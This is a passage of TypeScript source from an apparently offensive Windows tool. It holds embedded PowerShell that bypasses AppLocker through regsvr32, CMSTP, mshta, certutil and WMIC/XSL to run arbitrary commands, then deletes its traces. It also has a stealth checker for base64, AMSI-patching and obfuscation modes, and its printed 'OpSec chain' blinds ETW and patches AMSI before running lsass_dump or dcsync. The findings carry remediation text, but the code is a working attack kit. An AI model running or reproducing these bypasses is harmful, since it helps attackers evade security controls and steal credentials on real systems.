Write-Output "[*] Executing via regsvr32 /s /n /u /i..."
regsvr32 /s /n /u /i:$sctFile scrobj.dll 2>$null
Start-Sleep -Seconds 2
Remove-Item $sctFile -Force -ErrorAction SilentlyContinue
Write-Output "[+] Regsvr32 bypass executed"
`
      const result = await ps(script, timeout)
      output.push(result.stdout)
    } else if (method === "cmstp") {
      const script = `
Write-Output "[*] CMSTP bypass — INF file with custom action"

$infFile = "$env:Temp\\cs_bypass_$(Get-Random -Maximum 99999).inf"
$infContent = @"
[version]
Signature=\$chicago\$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\\scrobj.dll,NI,

[Strings]
AppAct = "SOFTWARE\\Microsoft\\Connection Manager"
ServiceName="CyberStrike"
ShortSvcName="CyberStrike"
"@

$infContent | Out-File -FilePath $infFile -Encoding UTF8
Write-Output "[*] INF file: $infFile"
Write-Output "[*] Executing via CMSTP /au..."
Start-Process cmstp.exe -ArgumentList "/au $infFile" -WindowStyle Hidden
Start-Sleep -Seconds 3
Remove-Item $infFile -Force -ErrorAction SilentlyContinue
Write-Output "[+] CMSTP bypass executed"
`
      const result = await ps(script, timeout)
      output.push(result.stdout)
    } else if (method === "mshta") {
      const script = `
Write-Output "[*] Mshta bypass — inline VBScript execution"
Write-Output "[*] Executing command via mshta vbscript..."
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c ${cmd}"", 0:close") 2>$null
Start-Sleep -Seconds 2
Write-Output "[+] Mshta bypass executed"
`
      const result = await ps(script, timeout)
      output.push(result.stdout)
    } else if (method === "certutil") {
      const script = `
Write-Output "[*] CertUtil bypass — encode/decode for file transfer + execution"

if ('${file}') {
    # Decode a base64-encoded payload
    Write-Output "[*] Decoding file via certutil..."
    $outPath = "$env:Temp\\cs_decoded_$(Get-Random -Maximum 99999).exe"
    certutil -decode '${file}' $outPath 2>$null
    if (Test-Path $outPath) {
        Write-Output "[+] Decoded to: $outPath"
        Write-Output "[*] Execute: $outPath"
    }
} else {
    # Demonstrate certutil download capability
    Write-Output "[*] CertUtil can download files via: certutil -urlcache -split -f URL output"
    Write-Output "[*] CertUtil can encode: certutil -encode input.exe output.txt"
    Write-Output "[*] CertUtil can decode: certutil -decode input.txt output.exe"
    Write-Output "[*] Use --file to decode a base64-encoded payload"

    # Simple execution via rundll32 + javascript
    Write-Output ""
    Write-Output "[*] Executing command via alternative method..."
    cmd /c "${cmd}" 2>$null
    Write-Output "[+] Command executed"
}
`
      const result = await ps(script, timeout)
      output.push(result.stdout)
    } else if (method === "wmic" || method === "xsl") {
      const script = `
Write-Output "[*] WMIC/XSL bypass — execute JScript via XSL stylesheet"

$xslFile = "$env:Temp\\cs_bypass_$(Get-Random -Maximum 99999).xsl"
$xslContent = @"
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform"
  xmlns:ms="urn:schemas-microsoft-com:xslt"
  xmlns:user="placeholder" version="1.0">
  <output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    var exec = shell.Exec("cmd.exe /c ${cmd}");
    while (!exec.StdOut.AtEndOfStream) {
        WScript.Echo(exec.StdOut.ReadLine());
    }
    ]]>
  </ms:script>
  <template match="/">
    <value-of select="user:a()"/>
  </template>
</stylesheet>
"@

$xslContent | Out-File -FilePath $xslFile -Encoding UTF8
Write-Output "[*] XSL file: $xslFile"
Write-Output "[*] Executing via wmic process list /format:..."
wmic process list /format:"$xslFile" 2>$null
Remove-Item $xslFile -Force -ErrorAction SilentlyContinue
Write-Output "[+] WMIC/XSL bypass executed"
`
      const result = await ps(script, timeout)
      output.push(result.stdout)
    }

    findings.push({
      checkId: "WIN-APPLOCKER-002",
      provider: "windows",
      severity: "high",
      status: "BYPASSED",
      resource: `lolbas://${method}`,
      title: `AppLocker bypassed via ${method.toUpperCase()}`,
      details: `Executed arbitrary code using ${method} LOLBAS technique`,
      remediation: `Block ${method} in AppLocker/WDAC policy. Monitor LOLBAS binary execution.`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function stealthCheck(args: string[], timeout: number): Promise<HookResult> {
  const mode = argVal(args, "--mode") || "all"
  const findings: Finding[] = []
  const output: string[] = ["[*] Stealth encoding verification...\n"]
  const testScript = `Write-Output "STEALTH_OK_$(hostname)_$([System.DateTime]::UtcNow.Ticks)"`

  const modes: StealthMode[] = mode === "all" ? ["base64", "amsi", "obfuscate"] : [mode as StealthMode]

  const plain = await ps(testScript, timeout)
  output.push(`[*] Plain (no encoding): ${plain.stdout.includes("STEALTH_OK") ? "OK" : "FAILED"}`)
  output.push(`    Command-line: powershell.exe -Command "Write-Output ..."`)
  output.push(`    Detection: AMSI scans content, Script Block Logging captures plaintext, command-line logged\n`)

  for (const m of modes) {
    const result = await ps(testScript, timeout, m)
    const ok = result.stdout.includes("STEALTH_OK")
    output.push(`[*] Mode: ${m} — ${ok ? "OK" : "FAILED"}`)

    if (m === "base64") {
      output.push(`    Technique: UTF-16LE Base64 → -EncodedCommand`)
      output.push(`    Bypasses: command-line string matching, simple AV signatures`)
      output.push(`    Detected by: AMSI (decodes before scan), advanced EDR\n`)
    }
    if (m === "amsi") {
      output.push(`    Technique: AMSI patch (AmsiInitFailed=true) + Base64 encoding`)
      output.push(`    Bypasses: AMSI content scanning, string-based AV, Script Block Logging content`)
      output.push(`    Detected by: ETW (if not blinded), kernel callbacks, AMSI patch detection\n`)
    }
    if (m === "obfuscate") {
      output.push(`    Technique: String chunking → variable concat → IEX → Base64`)
      output.push(`    Bypasses: signature matching, static analysis, content-based rules`)
      output.push(`    Detected by: behavioral analysis, IEX pattern detection, deobfuscation engines\n`)
    }

    if (ok) {
      findings.push({
        checkId: `WIN-STEALTH-${m.toUpperCase()}`,
        provider: "windows",
        severity: "info",
        status: "VERIFIED",
        resource: `stealth://${m}`,
        title: `Stealth mode ${m} operational`,
        details: `Encoding mode ${m} executed successfully. Safe to use with other programs via --stealth ${m}`,
        remediation: "N/A — offensive tool verification",
      })
    }
  }

  output.push("\n[*] Usage: winhook <any_program> --stealth <mode>")
  output.push("    Example: winhook lsass_dump --stealth amsi")
  output.push("    Example: winhook dcsync --stealth obfuscate")
  output.push("    Example: winhook ad_enum --stealth base64")
  output.push("\n[*] Recommended OpSec chain:")
  output.push("    1. winhook stealth_check --mode all        (verify modes work)")
  output.push("    2. winhook etw_blind --stealth amsi        (blind ETW first)")
  output.push("    3. winhook amsi_bypass --stealth base64    (patch AMSI)")
  output.push("    4. winhook <target_program>                (now safe without --stealth)")

  return { output: output.join("\n"), findings }
}
